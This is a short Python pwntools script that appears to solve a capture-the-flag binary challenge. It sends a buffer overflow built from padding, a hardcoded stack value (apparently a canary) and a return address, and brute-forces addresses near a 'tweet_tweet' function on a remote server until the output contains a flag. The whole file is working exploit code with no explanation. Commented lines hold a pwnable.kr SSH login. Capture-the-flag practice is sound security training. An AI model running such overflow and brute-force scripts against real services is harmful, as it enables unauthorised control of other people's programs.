#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./challenge", checksec = False)

#sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
#con = sh.process("path")

# con=process()
# gdb.attach(con, gdbscript = "b*0x804948d")
# con.sendlineafter(b"letters should its name have?", b"200")
# payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + p32(elf.sym['tweet_tweet']) 
# con.sendlineafter(b"And what's the name?", payload)

# ret = 0x80494e4
for i in range(0x8049215+100, elf.sym['tweet_tweet']+300):
    con = remote("34.125.199.248", 5674)
    log.info("Trying: " + hex(i))
    con.sendlineafter(b"letters should its name have?", b"200")
    payload = b"A"*32 + b"NECGLSPQ" + b"B"*16 + p32(i) 
    con.sendafter(b"And what's the name?", payload)
    ans = con.recvall()
    if b"CTF" in ans:
        print(ans)
        break

# con.interactive()
